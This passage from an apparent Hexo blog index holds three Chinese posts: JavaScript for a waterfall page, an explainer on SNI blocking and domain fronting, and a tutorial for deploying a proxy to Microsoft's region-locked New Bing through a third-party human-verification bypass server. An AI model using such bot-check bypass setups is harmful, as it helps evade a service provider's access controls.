class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&quot;show&quot;</span>);</span><br><span class="line">      &#125;, <span class="number">500</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">commentText</span>: <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (e == <span class="string">&quot;undefined&quot;</span> || e == <span class="string">&quot;null&quot;</span>) e = <span class="string">&quot;好棒！&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> n = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;el-textarea__inner&quot;</span>)[<span class="number">0</span>],</span><br><span class="line">      t = <span class="variable language_">document</span>.<span class="title function_">createEvent</span>(<span class="string">&quot;HTMLEvents&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!n) <span class="keyword">return</span>;</span><br><span class="line">    t.<span class="title function_">initEvent</span>(<span class="string">&quot;input&quot;</span>, !<span class="number">0</span>, !<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">var</span> o = <span class="title function_">replaceAll</span>(e, <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\n&gt; &quot;</span>);</span><br><span class="line">    (n.<span class="property">value</span> = <span class="string">&quot;&gt; &quot;</span> + o + <span class="string">&quot;\n\n&quot;</span>), n.<span class="title function_">dispatchEvent</span>(t);</span><br><span class="line">    <span class="keyword">var</span> i = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#post-comment&quot;</span>).<span class="property">offsetTop</span>;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">scrollTo</span>(<span class="number">0</span>, i - <span class="number">80</span>),</span><br><span class="line">      n.<span class="title function_">focus</span>(),</span><br><span class="line">      n.<span class="title function_">setSelectionRange</span>(-<span class="number">1</span>, -<span class="number">1</span>),</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;comment-tips&quot;</span>) &amp;&amp; <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;comment-tips&quot;</span>).<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&quot;show&quot;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">blogessay.<span class="title function_">changeTimeInEssay</span>();</span><br><span class="line">blogessay.<span class="title function_">reflashEssayWaterFall</span>();</span><br></pre></td></tr></table></figure><p>上面这段代码是 <a href="https://blog.anheyu.com/posts/c248.html" rel="external nofollow noreferrer">即刻短文（瀑布流）部署方案</a> 提供的<code>custom.js</code>。然而我在使用时发现，这这可能会出现<code>essay.yml</code>中<code>date</code>日期距今不足 30 日导致页面渲染出错的问题。有一个“折中方案”，可以这样：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">var blogessay = &#123;</span><br><span class="line">  diffDate: function (d, more = false) &#123;</span><br><span class="line">    const dateNow = new Date();</span><br><span class="line">    const datePost = new Date(d);</span><br><span class="line">    const dateDiff = dateNow.getTime() - datePost.getTime();</span><br><span class="line">    const minute = 1000 * 60;</span><br><span class="line">    const hour = minute * 60;</span><br><span class="line">    const day = hour * 24;</span><br><span class="line">    const month = day * 30;</span><br><span class="line"></span><br><span class="line">    let result;</span><br><span class="line"><span class="addition">+    const monthCount = dateDiff / month;</span></span><br><span class="line"><span class="addition">+    const dayCount = dateDiff / day;</span></span><br><span class="line"><span class="addition">+    const hourCount = dateDiff / hour;</span></span><br><span class="line"><span class="addition">+    const minuteCount = dateDiff / minute;</span></span><br><span class="line"></span><br><span class="line">    if (more) &#123;</span><br><span class="line">      const monthCount = dateDiff / month;</span><br><span class="line">      const dayCount = dateDiff / day;</span><br><span class="line">      const hourCount = dateDiff / hour;</span><br><span class="line">      const minuteCount = dateDiff / minute;</span><br><span class="line"></span><br><span class="line">      if (monthCount &gt;= 1) &#123;</span><br><span class="line">        result = datePost.toLocaleDateString().replace(/\//g, &quot;-&quot;);</span><br><span class="line">      &#125; else if (dayCount &gt;= 1) &#123;</span><br><span class="line"><span class="deletion">-        result = parseInt(dayCount) + &quot; &quot; + GLOBAL_CONFIG.date_suffix.day;</span></span><br><span class="line"><span class="addition">+        result = parseInt(dayCount) + &quot; &quot; + daySuffix;</span></span><br><span class="line">      &#125; else if (hourCount &gt;= 1) &#123;</span><br><span class="line"><span class="deletion">-        result = parseInt(hourCount) + &quot; &quot; + GLOBAL_CONFIG.date_suffix.hour;</span></span><br><span class="line"><span class="addition">+        result = parseInt(hourCount) + &quot; &quot; + hourSuffix;</span></span><br><span class="line">      &#125; else if (minuteCount &gt;= 1) &#123;</span><br><span class="line"><span class="deletion">-        result = parseInt(minuteCount) + &quot; &quot; + GLOBAL_CONFIG.date_suffix.min;</span></span><br><span class="line"><span class="addition">+        result = parseInt(minuteCount) + &quot; &quot; + minSuffix;</span></span><br><span class="line">      &#125; else &#123;</span><br><span class="line"><span class="deletion">-        result = GLOBAL_CONFIG.date_suffix.just;</span></span><br><span class="line"><span class="addition">+        result = suffix.just;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      result = parseInt(dateDiff / day);</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure></div></details><details class="toggle" ><summary class="toggle-button" style="">waterfall.js</summary><div class="toggle-content"><p>在<code>【Blogroot】/source/js</code>目录下创建<code>waterfall.js</code>并编辑：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">waterfall</span>(<span class="params">a</span>) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">b</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> c = <span class="variable language_">window</span>.<span class="title function_">getComputedStyle</span>(b);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseFloat</span>(c[<span class="string">&quot;margin&quot;</span> + a]) || <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">c</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">d</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseFloat</span>(a.<span class="property">style</span>.<span class="property">top</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">e</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseFloat</span>(a.<span class="property">style</span>.<span class="property">left</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a.<span class="property">clientWidth</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">g</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a.<span class="property">clientHeight</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">h</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d</span>(a) + <span class="title function_">g</span>(a) + <span class="title function_">b</span>(<span class="string">&quot;Bottom&quot;</span>, a);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">i</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">e</span>(a) + <span class="title function_">f</span>(a) + <span class="title function_">b</span>(<span class="string">&quot;Right&quot;</span>, a);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">j</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    a = a.<span class="title function_">sort</span>(<span class="keyword">function</span> (<span class="params">a, b</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">h</span>(a) === <span class="title function_">h</span>(b) ? <span class="title function_">e</span>(b) - <span class="title function_">e</span>(a) : <span class="title function_">h</span>(b) - <span class="title function_">h</span>(a);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">k</span>(<span class="params">b</span>) &#123;</span><br><span class="line">    <span class="title function_">f</span>(a) != t &amp;&amp; (b.<span class="property">target</span>.<span class="title function_">removeEventListener</span>(b.<span class="property">type</span>, <span class="variable language_">arguments</span>.<span class="property">callee</span>), <span class="title function_">waterfall</span>(a));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> a &amp;&amp; (a = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(a));</span><br><span class="line">  <span class="keyword">var</span> l = [].<span class="property">map</span>.<span class="title function_">call</span>(a.<span class="property">children</span>, <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (a.<span class="property">style</span>.<span class="property">position</span> = <span class="string">&quot;absolute&quot;</span>), a;</span><br><span class="line">  &#125;);</span><br><span class="line">  a.<span class="property">style</span>.<span class="property">position</span> = <span class="string">&quot;relative&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> m = [];</span><br><span class="line">  l.<span class="property">length</span> &amp;&amp; ((l[<span class="number">0</span>].<span class="property">style</span>.<span class="property">top</span> = <span class="string">&quot;0px&quot;</span>), (l[<span class="number">0</span>].<span class="property">style</span>.<span class="property">left</span> = <span class="title function_">c</span>(<span class="title function_">b</span>(<span class="string">&quot;Left&quot;</span>, l[<span class="number">0</span>]))), m.<span class="title function_">push</span>(l[<span class="number">0</span>]));</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">1</span>; n &lt; l.<span class="property">length</span>; n++) &#123;</span><br><span class="line">    <span class="keyword">var</span> o = l[n - <span class="number">1</span>],</span><br><span class="line">      p = l[n],</span><br><span class="line">      q = <span class="title function_">i</span>(o) + <span class="title function_">f</span>(p) &lt;= <span class="title function_">f</span>(a);</span><br><span class="line">    <span class="keyword">if</span> (!q) <span class="keyword">break</span>;</span><br><span class="line">    (p.<span class="property">style</span>.<span class="property">top</span> = o.<span class="property">style</span>.<span class="property">top</span>), (p.<span class="property">style</span>.<span class="property">left</span> = <span class="title function_">c</span>(<span class="title function_">i</span>(o) + <span class="title function_">b</span>(<span class="string">&quot;Left&quot;</span>, p))), m.<span class="title function_">push</span>(p);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (; n &lt; l.<span class="property">length</span>; n++) &#123;</span><br><span class="line">    <span class="title function_">j</span>(m);</span><br><span class="line">    <span class="keyword">var</span> p = l[n],</span><br><span class="line">      r = m.<span class="title function_">pop</span>();</span><br><span class="line">    (p.<span class="property">style</span>.<span class="property">top</span> = <span class="title function_">c</span>(<span class="title function_">h</span>(r) + <span class="title function_">b</span>(<span class="string">&quot;Top&quot;</span>, p))), (p.<span class="property">style</span>.<span class="property">left</span> = <span class="title function_">c</span>(<span class="title function_">e</span>(r))), m.<span class="title function_">push</span>(p);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">j</span>(m);</span><br><span class="line">  <span class="keyword">var</span> s = m[<span class="number">0</span>];</span><br><span class="line">  a.<span class="property">style</span>.<span class="property">height</span> = <span class="title function_">c</span>(<span class="title function_">h</span>(s) + <span class="title function_">b</span>(<span class="string">&quot;Bottom&quot;</span>, s));</span><br><span class="line">  <span class="keyword">var</span> t = <span class="title function_">f</span>(a);</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">addEventListener</span> ? <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;resize&quot;</span>, k) : (<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">onresize</span> = k);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></details><p>之后编辑根目录下<code>_config.butterfly.yml</code>文件，在<code>inject:</code>将这三个文件引入：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/essay.css&quot;/&gt;</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">async</span> <span class="string">data-pjax</span> <span class="string">src=&quot;/js/essay.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">async</span> <span class="string">data-pjax</span> <span class="string">src=&quot;/js/waterfall.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure><p>之后执行 Hexo 三连即可生效。</p><h2 id="参考：">参考：</h2><blockquote><p><a href="https://blog.zhheo.com/p/557c9e72.html" rel="external nofollow noreferrer">https://blog.zhheo.com/p/557c9e72.html</a><br><a href="https://blog.anheyu.com/posts/c248.html" rel="external nofollow noreferrer">https://blog.anheyu.com/posts/c248.html</a><br><a href="https://meuicat.com/blog/67/index.html" rel="external nofollow noreferrer">https://meuicat.com/blog/67/index.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SNI 技术与阻断</title>
      <link href="/posts/3730684123/"/>
      <url>/posts/3730684123/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>为讨论方便，本文会存在引用、举例的内容；为确保内容安全性，在此不提供具体的方法。</p><h2 id="铺垫">铺垫</h2><h3 id="传输协议">传输协议</h3><blockquote><p>HTTP（Hyper Text Transfer Protocol，超文本传输协议）</p></blockquote><p>这是用于从万维网（ WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议，是基于 TCP/IP 通信协议来传递数据。日常浏览的各种网页都是通过该协议传输，但是它的过程没有加密，不安全。</p><blockquote><p>HTTPS（HyperText Transfer Protocol Secure，超文本传输安全协议）</p></blockquote><p>这是一种通过计算机网络进行安全通信的传输协议。它经由 HTTP 进行通信，但利用 SSL/TLS 来加密数据包，HTTPS 开发的主要目的，是提供对网站服务器的身份认证，保护交换资料的隐私与完整性。</p><p>HTTP 的 URL 是由 <code>http://</code> 起始与默认使用端口 <code>80</code>，HTTPS 的 URL 是由 <code>https://</code> 起始与默认使用端口 <code>443</code>。</p><blockquote><p>SSL/TLS（Secure Socket Layer，安全套接层；Transport Layer Security，传输层安全）</p></blockquote><p>它是一种密码通信框架，他是世界上使用最广泛的密码通信方法。SSL/TLS 综合运用了密码学中的对称密码，消息认证码，公钥密码，数字签名，伪随机数生成器等，可以说是密码学中的集大成者。TLS 实际上相当于 SSL 的后续版本。</p><blockquote><p>SNI（Server Name Indication，服务器名称指示）</p></blockquote><p>它是 TLS 的扩展，这允许在握手过程开始时通过客户端告诉它正在连接的服务器的主机名称，用来解决一个服务器拥有多个域名的情况。</p><h3 id="GFW-常见保护原理">GFW 常见保护原理</h3><p>众所周知防火长城（以下简称 GFW）这个工程由若干个部分组成，实现不同功能，其最大的功能是监控和过滤互联网内容。</p><p>它对网络内容的过滤和分析是双向的，GFW 不仅针对大陆读者访问国外网站进行干扰，也对国外访问者访问在大陆的网站进行处理。</p><blockquote><p>关键字过滤</p></blockquote><p>Http 协议数据包头部是明文的，所以 GFW 一旦发现连接有敏感词，马上就会伪装成连接两方，向真正的对方发送 RST 数据包，产生异常，从而导致对方关闭连接。</p><blockquote><p>IP 封锁</p></blockquote><p>在出境的网关上加一条伪造的路由规则，从而使一些 IP 的数据包无法正确地被送达。其封路由比较严格，可能因为某个敏感站点，导致跟他同一 IP 的其他站点也无法访问。</p><blockquote><p>DNS 污染、劫持</p></blockquote><p>它会对所有经过骨干出口路由的在 UDP 的 53 端口上的域名查询进行检测，一旦发现有黑名单里的域名，它就会伪装并返回虚假结果。由于 UDP 自身现实，访问者只能接受到最先返回的结果。即便使用 TCP 协议，它可能会发送 RST，导致连接被重置。</p><blockquote><p>特定端口</p></blockquote><p>字面意思，丢弃特定端口上的数据包，使得某些功能无法使用，例如封锁 443 端口会导致 SSL 故障。</p><blockquote><p>加密连接的干扰</p></blockquote><p>由于加密传输公钥仍然是明文，因此它能据此识别特定服务的证书，在遇到黑名单”加密连接时，它会发送 RST 数据包，干扰连接从而切断握手。</p><h2 id="网站受屏蔽情况">网站受屏蔽情况</h2><p>实际上有与之相似情况的网站还有很多，譬如 Steam、GitHub 等，这里以 Pixiv 作引。</p><p>通常情况下，对于这些网站，如果只用 hosts 解析 IP 地址，连接仍会被 GFW 抢先发送的 RST 报文重置。</p><p>可在这个情况下，有些民间客户端居然能绕开这个限制……</p><h2 id="SNI-原理">SNI 原理</h2><p>TLS 有一个扩展，使得访问在 Client Hello 阶段客户端浏览器会以明文形式向服务器发送要访问网站的域名。</p><p>在最开始的 Clint Hello 阶段，双方还没有确认加密方式，在报文中采用的是明文状态，其中 Extension 字段中包含了 SNI 信息，也就是当前正在请求的域名，而这个信息可通过抓包得到。</p><p>SNI 的重要过程之一便是在客户端与服务器建立连接的时候就发送要连接的域名，以便服务器返回一张颁发给指定域名的证书；如果这是个不存在的域名，服务器会发送一张默认证书给客户端以便连接能够继续，随后进行握手步骤，在协商结束后开始通讯加密。</p><p>而 GFW 能根据这段明文进行处理，即通过 Server Name 字段来检查域名，判断是否阻止对这个 IP 的连接，从而导致无法正常访问。</p><h2 id="域前置">域前置</h2><p>域前置（Domain Fronting）则是利用有的服务器不验证 SNI 的这一特点，给 GFW 和服务器一个假的 SNI。GFW 没有私钥，只能通过 SNI 和 IP 判断网站，因此可以被欺骗。但服务器有私钥，解开后，服务器是通过 HTTP 请求头判断你要访问哪个网站的，SNI 便暂可搁置一旁了。</p><p>但毕竟需要服务端有配置，如果服务器不能以我们希望的方式响应无效的 Server Name，在收到这样的数据包后直接拒绝连接，那这种方法就失效了。</p><p>有的网站比如 Google 这类 IP 黑洞的网站，仅使用域前置时无效的，因为通常被 SNI 阻断的网站，也有 DNS 污染。而且对于有些一定要用 SNI 证书的而言（譬如虚拟主机、Cloudflare 免费版），唯一的解决办法就是 ESNI。</p><h2 id="后记">后记</h2><p>参考：</p><blockquote><p><a href="https://www.xkww3n.cyou/2020/05/01/sni-blocking-and-domain-fronting/" rel="external nofollow noreferrer">https://www.xkww3n.cyou/2020/05/01/sni-blocking-and-domain-fronting/</a><br><a href="https://gulut.github.io/gulut-blog/post1/2020/05/31/2020-05-31-by-pass-the-gfw-by-sni/" rel="external nofollow noreferrer">https://gulut.github.io/gulut-blog/post1/2020/05/31/2020-05-31-by-pass-the-gfw-by-sni/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 信息技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建免费的 New Bing 网站</title>
      <link href="/posts/1109049055/"/>
      <url>/posts/1109049055/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>“教程”这一节中提到两个项目地址，第二个的开发者制做了项目官网，详见 <a href="https://www.b1ng.chat/" rel="external nofollow noreferrer">www.b1ng.chat</a>。由于其中一些内容发生变化，且作者提供的教程更为详细、方案更多，因此我建议诸位移步他提供的 <a href="https://github.com/Harry-zklcdc/go-proxy-bingai/wiki" rel="external nofollow noreferrer">教程</a>，本文将只作为体验项目记录。</p><p>另外，由于一些原因，貌似 Cloudflare 部署有比较大的概率会加载不成功。</p><blockquote><p>2024.6 更新：</p></blockquote><p>项目 issue 中，目前官网可能已经关闭了原来核心 API 相关文件的加载，即使加载，对网络的要求也变高了。或许还有另外一些项目可以试试，例如“ms-copilot-play<br>”。</p><hr><p>众所周知 ChatGPT 官网在国内无法直接访问，即使访问限制也比较多。微软搞了个 New Bing，使用资格不太好获取，而且现在还锁区了。</p><p>这两年 AI 火得不行，别人都开始内测生成 60 秒的视频了，咱连聊天都不好说，怎的能行？</p><p>自己搭建演示站？</p><h3 id="准备工作">准备工作</h3><ul><li>能正常连接 GitHub 的网络</li><li>GitHub 账户</li><li>自己的域名（解决 Vercel 和 CF 在国内的访问问题）</li><li>阅读文档和搜索的能力</li></ul><h3 id="教程">教程</h3><p>注册 GitHub 账户。找到 <a href="https://github.com/adams549659584/go-proxy-bingai" rel="external nofollow noreferrer">https://github.com/adams549659584/go-proxy-bingai</a>，Fork 到自己账户下。</p><p>由于目前该仓库作者说不维护了，也可使用另一个版本：<a href="https://github.com/Harry-zklcdc/go-proxy-bingai" rel="external nofollow noreferrer">https://github.com/Harry-zklcdc/go-proxy-bingai</a>，Fork 到自己账户下。本文以此作为演示。</p><h4 id="BingAI-本体">BingAI 本体</h4><p>前往 <a href="https://vercel.com/login" rel="external nofollow noreferrer">Vercel</a>，可选择<code>Continue with GitHub</code>登录，在弹出窗口点击<code>Authorize Vercel</code>以授权。首次登入 Vercel 还需要手机号注册（可以使用+86 手机号）。</p><p>进入 Vercel 主界面，点击右侧<code>Add New...</code>-&gt;<code>Project</code>。在界面中找到刚才 Fork 的仓库。如果没有，点击下方<code>Adjust GitHub App Permissions →</code>-&gt;<code>Only select repositories</code>选中仓库并<code>Save</code>安装 Vercel 组件，点击<code>Import</code>。</p><p>在下面<code>Environment Variables</code>界面，左侧<code>Key</code>填入<code>BYPASS_SERVER</code>，即<code>人机验证服务地址</code>，右侧填入地址，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://bypass.b1ng.chat</span><br></pre></td></tr></table></figure><p>之后点击<code>Add</code>。如果希望自己部署服务地址，详见 <a href="https://github.com/Harry-zklcdc/go-proxy-bingai/wiki/Vercel-%E9%83%A8%E7%BD%B2" rel="external nofollow noreferrer">https://github.com/Harry-zklcdc/go-proxy-bingai/wiki/Vercel-%E9%83%A8%E7%BD%B2</a></p><p>点击<code>Deploy</code>并等待，出现<code>Congratulations!</code>表明部署成功。由于<code>.vercel.app</code>在国内无法正常访问，还需在该项目中进入<code>Settings</code>-&gt;<code>Domains</code>添加自己的域名，DNS 服务商那里解析 CNAME 填写下面这个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cname-china.vercel-dns.com</span><br></pre></td></tr></table></figure><p>或者填写 A 记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">76.223.126.88</span><br></pre></td></tr></table></figure><p>等待一会，解析成功后 Vercel 会自动申请 SSL 证书，之后便可以通过绑定的域名访问。</p><h4 id="Cloudflare-Worker">Cloudflare Worker</h4><p>【其实可以只部署这个，它单独就能使用】</p><p>注册 Cloudflare 账户并确保有一个自己的域名，之后进入<code>Worker 和 Pages</code>-&gt;<code>创建应用程序</code>-&gt;<code>创建 Worker</code>-&gt;自定义名称后<code>部署</code>-&gt;<code>编辑代码</code>，如果已经创建好 Worker，也可以通过<code>Workers 和 Pages</code>-&gt;<code>【Worker 名称】</code>-&gt;<code>快速编辑</code>进入编译页面。</p><p>删除其中所有代码后，将 <a href="https://github.com/Harry-zklcdc/go-proxy-bingai/blob/master/cloudflare/worker.js" rel="external nofollow noreferrer">https://github.com/Harry-zklcdc/go-proxy-bingai/blob/master/cloudflare/worker.js</a> 中的内容粘贴其中。然后修改第 8 行内容为<code>人机验证服务</code>地址， 例如前面的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://bypass.b1ng.chat</span><br></pre></td></tr></table></figure><p>之后点击左侧文件形状的图标（文件浏览器）， 右键<code>New File</code>， 添加文件名为 <code>bjs.js</code>的文件，清空其中的代码，将 <a href="https://github.com/Harry-zklcdc/go-proxy-bingai/blob/master/cloudflare/bjs.js" rel="external nofollow noreferrer">https://github.com/Harry-zklcdc/go-proxy-bingai/blob/master/cloudflare/bjs.js</a> 中的内容复制粘贴其中，不要理会报错。然后<code>保存并部署</code>即可。</p><p>【选】由于<code>.worker.dev</code>在国内访问不便，需在<code>Workers 和 Pages</code>-&gt;<code>【Worker 名称】</code>-&gt;<code>设置</code>-&gt;<code>触发器</code>-&gt;<code>添加自定义域</code>添加自己的域名，等待初始化完成。这个可以直接访问，也可以作为自定义聊天服务器使用。</p><p>接下来修改 Cloudflare Worker 路由【假设你前面给部署在 Vercel 的示例绑定域名为<code>vc.example.com</code>，在 Cloudflare Worker 绑定的域名为<code>cf.example.com</code>。】。进入 Cloudflare 控制台-&gt;<code>Workers 和 Pages</code>-&gt;<code>【Worker 名称】</code>-&gt;<code>设置</code>-&gt;<code>触发器</code>-&gt;<code>添加路由</code>，添加两条：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 请根据自身情况修改</span><br><span class="line">vc.example.com/sydney/*</span><br><span class="line">vc.example.com/designer/rtc/*</span><br></pre></td></tr></table></figure><p>区域选择你的域名，等待 Vercel 部署完成，即可使用绑定的域名访问</p><h3 id="升级">升级</h3><p>在 Fork 的项目地址中，点击<code>Sync Fork</code>, 等待 Vercel 自动检测拉取仓库部署完成后即可。</p><hr><h3 id="后记">后记</h3><p><strong>遇到一切问题，先点左下角<code>新主题</code>试试，不行使用刷新大法（Shift + F5 或 Ctrl + Shift + R 或 右上角设置中的一键重置），最终大招就 清理浏览器缓存 及 Cookie ，比如（24 小时限制、未登录提示等等）</strong></p><p>另外，一切准备妥当之后，部署在 Vercel 和 CF 的两个站貌似可以单独访问，至于 AI 识别到的地区是哪就不确定了。</p><p><strong>不要滥用</strong>，一方面是防止 Bing 检测导致使用难度继续加大；另一方面见作者免责声明：</p><blockquote><p>本项目所有功能仅供学习和娱乐交流使用，不代表微软的官方观点或立场。本项目不对任何由使用本项目产生的直接或间接损失负责，包括但不限于数据丢失、系统损坏、法律风险等。本项目不保证本站点的功能完整性、稳定性、安全性和准确性，也不保证本项目与微软 New Bing 的一致性。本项目不对本站点的内容进行审核或监督，用户应自行承担使用本站点的风险和责任。本项目保留随时修改或终止本站点的权利，恕不另行通知。</p><p>在中国大陆范围内使用请遵循《生成式人工智能服务管理暂行办法》的要求，请勿对中国大陆地区公众提供一切未经备案的生成式人工智能服务。本项目开发者不对使用本项目产生的任何后果负责。</p></blockquote>]]></content>
      
      
      <categories>
          
